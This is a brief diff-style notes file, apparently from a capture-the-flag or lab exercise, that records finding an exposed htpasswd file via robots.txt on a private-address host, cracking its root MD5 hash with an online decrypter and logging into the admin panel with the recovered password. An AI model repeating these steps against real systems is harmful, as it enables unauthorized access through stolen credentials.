@@ -1,0 +1,11 @@
+http://10.11.249.0/robots.txt
+
+http://10.11.249.4/whatever/htpasswd
+
+root:437394baff5aa33daa618be47b75cb49
+
+https://md5decrypt.net/
+
+qwerty123@
+
+http://10.11.249.4/admin/ -> root:qwerty123@
